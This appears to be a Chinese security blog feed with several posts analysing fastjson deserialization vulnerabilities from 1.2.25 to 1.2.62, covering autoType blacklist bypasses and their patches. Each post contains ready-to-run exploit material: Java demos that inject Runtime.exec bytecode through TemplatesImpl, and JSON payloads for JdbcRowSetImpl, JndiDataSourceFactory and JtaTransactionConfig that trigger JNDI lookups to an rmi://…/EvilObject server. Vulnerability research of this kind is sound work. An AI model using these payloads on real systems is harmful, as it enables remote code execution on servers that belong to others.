<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.43&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">templatesimpl4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\"[&#123;\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line"></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p><img src="9.png" alt=""></p>
<p>从这个补丁可以看出，在1.2.44版本中，它删掉了原来的判断<code>LL</code>的方式，而是改为了若以<code>[</code>开头或以<code>;</code>结尾，都会抛出异常。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#1-2-43%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE" target="_blank" rel="noopener">Fastjson漏洞复现</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(二)</title>
    <url>/2020/05/16/fastjson-2/</url>
    <content><![CDATA[<p>前面介绍了最早的一个漏洞的利用方式。后来通过关闭默认的autotype以及增加黑名单来进行防御。本片文章分析了绕过这一防御的方式。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>1.2.25 &lt;= fastjson &lt;=1.2.41</li>
</ul>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>打开autotype<ul>
<li>JVM启动参数: -Dfastjson.parser.autoTypeSupport=True</li>
<li>代码中设置: ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</li>
</ul>
</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从1.2.25开始，增加了checkAutoType函数，加入了黑名单+白名单来防御autoType开启的情况。而此次的漏洞就是因为在autoType开启的情况下，绕过了checkAutoType。定位到checkAutoType代码(com.alibaba.fastjson.parser.ParserConfig.class)。</p>
<p><img src="1.png" alt=""><br><img src="2.png" alt=""></p>
<p>图中标注的4个框中的条件，后续的几次绕过也与它们有关，所以一起标注出来了。</p>
<ul>
<li>第一个框: 开启autoTypeSupport，通过白名单，再通过黑名单</li>
<li>第二个框: 从已经存在的map中获取clazz，若存在clazz，则直接返回</li>
<li>第三个框: 未开启autoTypeSupport，通过黑名单，再通过白名单，就加载目标类</li>
<li>第四个框: 开启autoTypeSupport，前面2步通过，就加载目标类</li>
</ul>
<p>根据上述可知，最终加载目标类有3种方式，一是不开启autoTypeSupport，二是开启autoTypeSupport，三是从map中获取clazz。</p>
<p>正常情况下TemplatesImpl类和JdbcRowSetImpl类的利用方式是无法成功的，因为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>和<code>com.sun.rowset.JdbcRowSetImpl</code>位于黑名单<code>com.sun.</code>中，如下图所示:</p>
<p><img src="3.png" alt=""></p>
<p>因此，绕过黑名单是一定需要的。因此这种情况下map中并不存在。</p>
<h2 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h2><p>此次分析的是，当autoType开启时，绕过黑名单，从而加载目标类。即通过第1，2个框，从而进入第4个框的方式。那么如何绕过呢？这就跟第4个框中的loadClass函数相关了。定位到TypeUtils.loadClass()。</p>
<p><img src="4.png" alt=""></p>
<p>可以看到它对className进行了处理之后再loadClass。  </p>
<ul>
<li>若className以<code>[</code>开头，则将其去掉。</li>
<li>若className以<code>L</code>开头，且以<code>;</code>结尾，也将这两者去掉</li>
</ul>
<p>前面黑名单的判断是用startsWith()这样的函数，这就给了攻击者可乘之机。再加上以<code>[</code>开头会实例化一个长度为0的Array，这里会出错。因此，只能利用className以<code>L</code>开头。且以<code>;</code>结尾的方式。</p>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,</span><br><span class="line">	&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整的demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.41&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p><img src="5.png" alt=""></p>
<p>完整的demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.41&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">templatesimpl</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line"></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object res = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><h3 id="1-将黑名单机制中的字符串改为hashcode"><a href="#1-将黑名单机制中的字符串改为hashcode" class="headerlink" title="1.将黑名单机制中的字符串改为hashcode"></a>1.将黑名单机制中的字符串改为hashcode</h3><p><img src="6.png" alt=""></p>
<h3 id="2-对checkAutoType也做了改变"><a href="#2-对checkAutoType也做了改变" class="headerlink" title="2.对checkAutoType也做了改变"></a>2.对checkAutoType也做了改变</h3><p>用于防止上述加入<code>L</code>和<code>;</code>的情况。<br><img src="7.png" alt=""></p>
<p>但是很显然，这样的改变使用2层<code>L</code>和<code>;</code>就能绕过。绕过的细节，在下一个系列进行介绍。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">enable_autotype</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(六)</title>
    <url>/2020/05/17/fastjson-6/</url>
    <content><![CDATA[<p>1.2.46版本中将<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>添加进黑名单，使得利用失败。此时出现了不开启<code>autotype</code>的情况下成功的绕过checkAutoType，且通杀1.2.47以前的所有版本。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>fastjson &lt;= 1.2.47</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该漏洞是通过绕过了checkAutoType的检查，从而成功利用。这个时候先来看看之前提到过的四块。</p>
<p><img src="1.png" alt=""><br><img src="2.png" alt=""></p>
<p>之前在fastjson回顾系列二中利用的是autotype开启的情况下，最终进入红框的loadClass，从而RCE的。而此次利用的是autotype未开启的情况下，利用第二个绿色框来达到RCE的。接下来具体看看</p>
<p>它首先利用了<code>java.lang.class</code>这个类，它并不在黑名单，所以可以过checkAutotype。过了checkAutotype之后，它对应的deserializer为<code>MiscCodeC</code>。如下所示:</p>
<p><img src="3.png" alt=""></p>
<p>跟进deserialze函数</p>
<p><img src="4.png" alt=""></p>
<p>在经过判断lexer.stringVal()的值是”val”为真的情况下，经过parser.parse()，取出其值，即”com.sun.rowset.JdbcRowSetImpl”。如下所示:</p>
<p><img src="5.png" alt=""></p>
<p>接着往下走，经过一系列判断，最终到达<code>TypeUtils.loadClass</code>函数。</p>
<p><img src="6.png" alt=""></p>
<p>此时的strVal为前面获取到的”com.sun.rowset.JdbcRowSetImpl”，跟进它</p>
<p><img src="7.png" alt=""></p>
<p>由于cache值默认为<code>true</code>，则进入mapping.put(className,clazz)，将”com.sun.rowset.JdbcRowSetImpl”与com.sun.rowset.JdbcRowSetImpl类对应起来。</p>
<p>然后继续反序列化，直接解析到<code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}</code>时，进入checkAutoType函数，由于autotype默认是关闭的，因此直接进入绿色的框，如下所示：</p>
<p><img src="8.png" alt=""></p>
<p>跟进getClassFromMapping()函数。</p>
<p><img src="9.png" alt=""></p>
<p>此时clazz为<code>com.sun.rowset.JdbcRowSetImpl</code>类从而直接return了。</p>
<p><img src="10.png" alt=""></p>
<p>到这里为止就绕过了checkAutoType的检查，后续就与之前一致了。</p>
<h1 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h1><p>根据上面的分析，exp分为2部分，一部分是将”com.sun.rowset.JdbcRowSetImpl”放入mapping中，另一个就是正常的获取到”com.sun.rowset.JdbcRowSetImpl”，且调用setAutoCommit函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;a&quot;:&#123;</span><br><span class="line">			&quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">			&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">	&quot;b&quot;:&#123;</span><br><span class="line">			&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">			&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">			&quot;autoCommit&quot;:true	</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整的demo:</p>
<p>jdbcrowsetimpl5</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.47&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;&#125;&#125;"</span>;</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>所有在黑名单中的类都可以用这种方式绕过，包括<code>TemplatesImpl</code>和<code>JndiDataSourceFactory</code></p>
</blockquote>
<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>1.2.48版本中修复了1.2.47的绕过，在MiscCodec，设置了cache为false。<br><img src="11.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#v1-2-47" target="_blank" rel="noopener">FastJson 反序列化学习#1.2.47</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(五)</title>
    <url>/2020/05/16/fastjson-5/</url>
    <content><![CDATA[<p>1.2.44版本中对<code>L</code>和<code>[</code>开头的情况进行了防御，使得在1.2.44版本时并没有出现任何的checkAutoType的绕过。但是却出现了对于黑名单的绕过。本篇文章对此进行深入的分析。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>1.2.44 &lt;= fastjson &lt;= 1.2.45</li>
<li>fastjson &lt;=  1.2.43 (也可成立，需要添加ibatis第三方包，而在前面的版本中无需ibatis包也可RCE)</li>
</ul>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>打开autoType</li>
<li>具备ibatis第三方包</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>黑名单的绕过是使用了<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>这个类，使用这个类需要额外的加入<code>ibatis</code>第三方包。由于ibatis在项目中也经常使用，所以影响范围广。</p>
<p>先来看看这个类，定位到setProperties()函数，如下所示:</p>
<p><img src="1.png" alt=""></p>
<p>在该函数中我们可以看到，有着JNDI注入的完整的一套。接下来看看uri即<code>properties.getProperty(&quot;data_source&quot;)</code>是否可控。那就需要在整个的过程中也反序列化<code>getProperties()</code>传入的参数。定位到该函数</p>
<p><img src="2.png" alt=""></p>
<p>在该函数中会调用父类即HashMap.get(‘data_source’)，获取到值。因此，传入的Properties为一个具有<code>&quot;data_source&quot;:&quot;rmi://127.0.0.1:1099/EvilObject&quot;</code>key-value对的HashMap即可。</p>
<blockquote>
</blockquote>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><h3 id="JndiDataSourceFactory"><a href="#JndiDataSourceFactory" class="headerlink" title="JndiDataSourceFactory"></a>JndiDataSourceFactory</h3><p>根据以上分析，可得出EXP为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class="line">	&quot;properties&quot;:&#123;</span><br><span class="line">						&quot;data_source&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">				 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整的demo为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.44-1.2.45,ibatis&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jndiDataSourcefactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":&#123;\"data_source\":\"rmi://127.0.0.1:1099/EvilObject\"&#125;&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>补丁就是增加了黑名单</p>
<p><img src="3.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#1-2-45%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE" target="_blank" rel="noopener">Fastjson漏洞复现</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(七)</title>
    <url>/2020/05/17/fastjson-7/</url>
    <content><![CDATA[<p>此后从1.2.48-1.2.68都是基于黑名单绕过的思路来进行利用的。此次介绍fastjson&lt;=1.2.62版本和fastjson&lt;=1.2.66版本的利用方式。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>fastjson &lt;= 1.2.62</li>
</ul>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>开启autoType</li>
<li>依赖第三方包ibatis-sqlmap</li>
<li>依赖第三方包Jta</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先定位到<code>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</code>类的setProperties函数</p>
<p><img src="1.png" alt=""></p>
<p>可以看到有完整的一套jndi注入，只需要考虑utxName是否可控。utxName来源于props.get(“UserTransaction”)。因此需要传入一个Properties类，其UserTransaction的值为jndi注入的uri。</p>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><p>根据上述的分析，exp构造如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,</span><br><span class="line">  &quot;properties&quot;: &#123;</span><br><span class="line">                  &quot;UserTransaction&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>补丁的方式非常的简单粗暴，就是将此类加入黑名单中。</p>
